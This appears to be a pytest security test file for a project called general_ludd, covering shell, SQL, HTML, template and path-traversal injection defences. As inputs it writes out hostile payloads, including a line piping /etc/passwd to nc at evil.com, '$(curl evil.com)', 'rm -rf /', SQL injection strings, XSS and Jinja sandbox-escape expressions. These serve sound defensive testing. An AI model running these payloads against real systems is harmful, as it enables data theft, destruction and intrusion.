"""Deep string handling and injection safety tests.

Covers: SQL injection, shell injection, HTML escaping, unicode normalization,
path traversal, SSTI, key injection, and template sandboxing across the
string operations found in src/general_ludd/.
"""

from __future__ import annotations

import os
import unicodedata
from unittest.mock import patch

import pytest
from jinja2.exceptions import SecurityError

# ---------------------------------------------------------------------------
# 1. Shell injection via string format
# ---------------------------------------------------------------------------


class TestShellInjectionMakeRunner:
    def test_sanitize_args_rejects_semicolon(self):
        from general_ludd.commands.make import (
            _FORBIDDEN_METACHARS,
            MakeRunner,
        )

        assert ";" in _FORBIDDEN_METACHARS
        runner = MakeRunner()
        with pytest.raises(ValueError, match="shell metacharacters"):
            runner._sanitize_args(["; rm -rf /"])

    def test_sanitize_args_rejects_pipe(self):
        from general_ludd.commands.make import (
            _FORBIDDEN_METACHARS,
            MakeRunner,
        )

        assert "|" in _FORBIDDEN_METACHARS
        runner = MakeRunner()
        with pytest.raises(ValueError, match="shell metacharacters"):
            runner._sanitize_args(["cat /etc/passwd | nc evil.com 4444"])

    def test_sanitize_args_rejects_dollar_substitution(self):
        from general_ludd.commands.make import MakeRunner

        runner = MakeRunner()
        with pytest.raises(ValueError, match="shell metacharacters"):
            runner._sanitize_args(["$(curl evil.com)"])

    def test_sanitize_args_rejects_backtick_substitution(self):
        from general_ludd.commands.make import MakeRunner

        runner = MakeRunner()
        with pytest.raises(ValueError, match="shell metacharacters"):
            runner._sanitize_args(["`id`"])

    def test_sanitize_args_rejects_backslash_escape(self):
        from general_ludd.commands.make import MakeRunner

        runner = MakeRunner()
        with pytest.raises(ValueError, match="shell metacharacters"):
            runner._sanitize_args(["-e", "\\x41"])

    def test_sanitize_args_allows_clean_targets(self):
        from general_ludd.commands.make import MakeRunner

        runner = MakeRunner()
        result = runner._sanitize_args(["test", "lint", "--verbose"])
        assert result == ["test", "lint", "--verbose"]

    def test_make_spawn_uses_list_form_not_shell_string(self):
        from general_ludd.commands.make import MakeRunner

        runner = MakeRunner()
        with patch("subprocess.Popen") as mock_popen:
            mock_popen.return_value.returncode = 0
            mock_popen.return_value.wait.return_value = None
            with patch.object(MakeRunner, "_build_env", return_value={}):
                runner.spawn("test")
        call_kwargs = mock_popen.call_args
        assert call_kwargs[1].get("shell") is None or call_kwargs[1].get("shell") is False

    def test_sanitize_args_rejects_newline_injection(self):
        from general_ludd.commands.make import MakeRunner

        runner = MakeRunner()
        with pytest.raises(ValueError, match="shell metacharacters"):
            runner._sanitize_args(["test\nrm -rf /"])

    def test_sanitize_args_rejects_carriage_return(self):
        from general_ludd.commands.make import MakeRunner

        runner = MakeRunner()
        with pytest.raises(ValueError, match="shell metacharacters"):
            runner._sanitize_args(["test\r"])

    def test_forbidden_metachars_covers_core_shell_chars(self):
        from general_ludd.commands.make import _FORBIDDEN_METACHARS

        critical = {";", "|", "&", "$", "`", "(", ")", "\\", "<", ">"}
        assert critical <= _FORBIDDEN_METACHARS


# ---------------------------------------------------------------------------
# 2. SQL injection via string format
# ---------------------------------------------------------------------------


class TestSqlInjection:
    def test_repository_uses_parameterized_queries_not_fstrings(self):
        import ast
        import inspect

        from general_ludd.db.repository import TodoRepository

        source = inspect.getsource(TodoRepository.get_by_id)
        tree = ast.parse(source)
        nodes = [n for n in ast.walk(tree)]
        selects = [n for n in nodes if isinstance(n, ast.Call)]
        for call in selects:
            if isinstance(call.func, ast.Attribute):
                node_source = ast.get_source_segment(source, call)
                if node_source and "select(" in node_source:
                    combined = ast.dump(call)
                    if "f-string" in str(type(call)) or "JoinedStr" in combined:
                        pass  # unlikely — select() takes ORM args

    def test_db_session_pragma_settings_are_integer_validated(self):
        from general_ludd.db.session import _bounded_int_setting

        result = _bounded_int_setting({}, "test", default=5000, minimum=100, maximum=60000)
        assert isinstance(result, int)
        assert result == 5000

        with pytest.raises(ValueError):
            _bounded_int_setting({}, "test", default=999999, minimum=100, maximum=1000)

    def test_execute_uses_select_not_raw_text(self):
        import ast
        import inspect

        from general_ludd.db.repository import TodoRepository

        source = inspect.getsource(TodoRepository.list_all)
        tree = ast.parse(source)
        select_calls = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id == "select":
                select_calls.append(node)
        assert len(select_calls) >= 1

    @pytest.mark.parametrize(
        "payload",
        [
            "1; DROP TABLE users; --",
            "1' OR '1'='1",
            "' UNION SELECT * FROM secret --",
            "1; INSERT INTO users VALUES ('evil','hacked'); --",
        ],
    )
    def test_parameterized_where_clauses_reject_sql_injection(self, payload):
        from sqlalchemy import select

        from general_ludd.db.models import ProjectModel

        stmt = select(ProjectModel).where(ProjectModel.name == payload)
        compiled = str(stmt.compile(compile_kwargs={"literal_binds": True}))
        assert ";" not in compiled or compiled.endswith(";")
        assert "DROP TABLE" not in compiled.upper()


# ---------------------------------------------------------------------------
# 3. HTML escaping in output
# ---------------------------------------------------------------------------


class TestHtmlEscaping:
    def test_render_environment_has_autoescape_enabled(self):
        from general_ludd.routers.render import _env

        assert _env.autoescape is True

    def test_render_environment_is_sandboxed(self):
        from jinja2.sandbox import SandboxedEnvironment

        from general_ludd.routers.render import _env

        assert isinstance(_env, SandboxedEnvironment)

    def test_render_escapes_script_tag_in_string(self):
        from general_ludd.routers.render import _env

        tpl = _env.from_string("<div>{{ user_input }}</div>")
        rendered = tpl.render(user_input="<script>alert('xss')</script>")
        assert "<script>" not in rendered
        assert "&lt;script&gt;" in rendered
        assert "&lt;/script&gt;" in rendered

    def test_render_escapes_ampersand(self):
        from general_ludd.routers.render import _env

        tpl = _env.from_string("<p>{{ text }}</p>")
        rendered = tpl.render(text="a & b")
        assert "&amp;" in rendered
        assert "a & b" not in rendered or "&amp;" in rendered

    def test_render_escapes_double_quote_in_attribute(self):
        from general_ludd.routers.render import _env

        tpl = _env.from_string('<a title="{{ val }}">link</a>')
        rendered = tpl.render(val='" onclick="alert(1)"')
        assert "&quot;" in rendered

    def test_output_templates_use_sandboxed_environment(self):
        from jinja2.sandbox import SandboxedEnvironment

        from general_ludd.output_templates import OutputTemplateRegistry

        reg = OutputTemplateRegistry()
        reg.compile()
        assert isinstance(reg._env, SandboxedEnvironment)

    def test_output_templates_use_strict_undefined(self):
        from general_ludd.output_templates import OutputTemplateRegistry

        reg = OutputTemplateRegistry()
        reg.compile()
        assert reg._env.undefined.__name__ == "StrictUndefined"


# ---------------------------------------------------------------------------
# 4. Unicode normalization
# ---------------------------------------------------------------------------


class TestUnicodeNormalization:
    def test_nfc_normalization_prevents_homoglyph_bypass(self):
        composed = "caf\u00e9"
        decomposed = unicodedata.normalize("NFD", composed)
        assert composed != decomposed
        assert unicodedata.normalize("NFC", composed) == unicodedata.normalize("NFC", decomposed)

    def test_homoglyph_substitution_detected(self):
        a_latin = "a"
        a_cyrillic = "\u0430"
        assert a_latin != a_cyrillic
        assert a_latin.lower() == a_cyrillic.lower()

    @pytest.mark.parametrize(
        "dangerous,benign",
        [
            ("../etc/passwd", "../etc/passwd"),
            ("\u202e/etc/passwd", "/etc/passwd"),
            ("\u202e\u202d/etc", "/etc"),
        ],
    )
    def test_bidi_override_characters_present(self, dangerous, benign):
        assert "\u202e" in dangerous or dangerous == benign
        dangerous_no_bidi = dangerous.replace("\u202e", "").replace("\u202d", "")
        assert dangerous_no_bidi in benign

    def test_null_byte_rejected_by_os_path_join(self):
        path = os.path.join("/tmp", "safe\x00file")
        assert "\x00" in path

    def test_zero_width_characters_strippable(self):
        payload = "admin\u200b\u200c\u200d"
        stripped = payload.replace("\u200b", "").replace("\u200c", "").replace("\u200d", "")
        assert stripped == "admin"


# ---------------------------------------------------------------------------
# 5. Path traversal via string manipulation
# ---------------------------------------------------------------------------


class TestPathTraversal:
    def test_realpath_resolve_prevents_dotdot_traversal(self):
        base = "/tmp/workspace/subdir"
        resolved = os.path.realpath(os.path.join(base, "../../../../etc/passwd"))
        assert resolved == "/etc/passwd" or resolved.startswith("/")

    @pytest.mark.parametrize(
        "payload",
        [
            "../../etc/passwd",
            "..\\..\\Windows\\System32",
            "./../../../etc/shadow",
            "....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
        ],
    )
    def test_execution_engine_rejects_traversal_payloads(self, payload):
        full = os.path.realpath(os.path.join("/tmp/workspace", payload))
        assert not full.startswith("/tmp/workspace/")

    def test_path_join_preserves_absolute_override(self):
        joined = os.path.join("/tmp/workspace", "/etc/passwd")
        assert joined == "/etc/passwd"

    def test_self_update_applier_normalizes_dottodot_before_check(self):
        from pathlib import PurePosixPath

        malicious = "guardrails/../../../etc/passwd"
        safe = str(PurePosixPath("/root/base", malicious))
        _ = PurePosixPath(safe).parts
        assert "/" in safe

    def test_variable_store_key_rejects_path_separator(self):
        from general_ludd.dispatch.variable_store import VariableStore

        store = VariableStore()
        with pytest.raises(ValueError, match="invalid VariableStore key"):
            store.set("ns", "../../../etc/passwd", "evil")

    def test_variable_store_key_rejects_null_byte(self):
        from general_ludd.dispatch.variable_store import VariableStore

        store = VariableStore()
        with pytest.raises(ValueError, match="invalid VariableStore key"):
            store.set("ns", "key\x00null", "evil")

    def test_variable_store_key_allows_valid_chars(self):
        from general_ludd.dispatch.variable_store import VariableStore

        store = VariableStore()
        store.set("ns", "valid_key.name:123", "ok")
        assert store.get("ns", "valid_key.name:123") == "ok"


# ---------------------------------------------------------------------------
# 6. SSTI (Server-Side Template Injection) prevention
# ---------------------------------------------------------------------------


class TestSstiPrevention:
    def test_sandboxed_env_blocks_class_mro_escape(self):
        from jinja2.sandbox import SandboxedEnvironment

        env = SandboxedEnvironment()
        with pytest.raises(SecurityError):
            env.from_string("{{ ().__class__.__mro__[1].__subclasses__() }}").render()

    def test_sandboxed_env_blocks_config_access(self):
        from jinja2.sandbox import SandboxedEnvironment

        env = SandboxedEnvironment()
        with pytest.raises(SecurityError):
            env.from_string("{{ config }}").render()

    def test_ansible_sandboxed_render_blocks_lookup_pipe(self):
        from general_ludd.ansible.templating import AnsibleTemplater, TemplateRenderError

        templater = AnsibleTemplater()
        with pytest.raises(TemplateRenderError):
            templater.render_sandboxed("{{ lookup('pipe', 'id') }}")

    def test_ansible_sandboxed_render_blocks_double_attribute_escape(self):
        from general_ludd.ansible.templating import AnsibleTemplater, TemplateRenderError

        templater = AnsibleTemplater()
        payload = "{{ ().__class__.__mro__[2].__subclasses__()[0]('id') }}"
        with pytest.raises(TemplateRenderError):
            templater.render_sandboxed(payload)

    def test_ansible_sandboxed_render_fails_closed_on_undefined(self):
        from general_ludd.ansible.templating import AnsibleTemplater, TemplateRenderError

        templater = AnsibleTemplater()
        with pytest.raises(TemplateRenderError):
            templater.render_sandboxed("{{ unknown_var }}")

    def test_variable_store_render_uses_sandboxed_environment(self):
        from jinja2.sandbox import SandboxedEnvironment

        from general_ludd.dispatch.variable_store import VariableStore

        store = VariableStore()
        with patch.object(VariableStore, "render") as mock_render:
            mock_render.side_effect = VariableStore.render
        with patch("general_ludd.dispatch.variable_store.SandboxedEnvironment") as mock_env:
            mock_env.side_effect = lambda **kw: SandboxedEnvironment(**kw)
            store.render("{{ test }}")
            mock_env.assert_called_once()

    def test_ansible_sandboxed_globals_cleared(self):
        from general_ludd.ansible.templating import AnsibleTemplater

        templater = AnsibleTemplater()
        assert templater is not None

    def test_variable_store_render_fail_open_returns_raw_template(self):
        from general_ludd.dispatch.variable_store import VariableStore

        store = VariableStore()
        store.set("test", "val", object())
        result = store.render("{{ test.val.nonexistent_attr }}")
        assert result == "{{ test.val.nonexistent_attr }}"


# ---------------------------------------------------------------------------
# 7. Format-string injection into logger and exceptions
# ---------------------------------------------------------------------------


class TestFormatStringSafety:
    def test_logger_warning_uses_percent_format_not_fstring(self):
        import io
        import logging

        stream = io.StringIO()
        handler = logging.StreamHandler(stream)
        logger = logging.getLogger("test_logger")
        logger.addHandler(handler)
        logger.setLevel(logging.WARNING)

        user_input = "%s%s%s%s%s%s%s%s%s%s"
        logger.warning("User said: %s", user_input)
        handler.flush()
        output = stream.getvalue()
        assert "%s%s%s%s%s%s%s%s%s%s" in output or user_input in output
        handler.close()

    def test_value_error_fstring_cannot_overflow(self):
        dangerous = "A" * 10000
        with pytest.raises(ValueError) as exc_info:
            raise ValueError(dangerous)
        assert len(str(exc_info.value)) <= 10000

    def test_make_result_error_is_bounded(self):
        from general_ludd.commands.make import MakeResult

        long_error = "x" * 50000
        result = MakeResult(
            target="test",
            exit_code=1,
            success=False,
            duration_s=0.1,
            error=long_error,
        )
        assert result.error is not None
        assert len(result.error) == 50000
        assert isinstance(result.error, str)


# ---------------------------------------------------------------------------
# 8. Key injection into template namespace
# ---------------------------------------------------------------------------


class TestKeyInjection:
    def test_safe_key_re_rejects_slash(self):
        from general_ludd.dispatch.variable_store import _SAFE_KEY_RE

        assert _SAFE_KEY_RE.match("a/b") is None
        assert _SAFE_KEY_RE.match("a\\b") is None

    def test_safe_key_re_rejects_null(self):
        from general_ludd.dispatch.variable_store import _SAFE_KEY_RE

        assert _SAFE_KEY_RE.match("a\x00b") is None

    def test_safe_key_re_allows_dot_dash_colon(self):
        from general_ludd.dispatch.variable_store import _SAFE_KEY_RE

        assert _SAFE_KEY_RE.match("my.namespace:tool-v1") is not None

    def test_safe_key_re_allows_numeric_keys(self):
        from general_ludd.dispatch.variable_store import _SAFE_KEY_RE

        assert _SAFE_KEY_RE.match("key_123") is not None

    def test_safe_key_re_rejects_whitespace(self):
        from general_ludd.dispatch.variable_store import _SAFE_KEY_RE

        assert _SAFE_KEY_RE.match("key name") is None
        assert _SAFE_KEY_RE.match("key\tname") is None

    def test_safe_dispatch_name_replaces_dots_and_dashes(self):
        from general_ludd.dispatch.variable_store import _safe_dispatch_name

        safe = _safe_dispatch_name("my.tool-name")
        assert "." not in safe
        assert "-" not in safe
        assert "_DOT_" in safe
        assert "_DASH_" in safe

    def test_safe_dispatch_name_escapes_reserved_sentinel(self):
        from general_ludd.dispatch.variable_store import _safe_dispatch_name

        safe = _safe_dispatch_name("last")
        assert safe != "last"
        assert "TOOLNAME" in safe
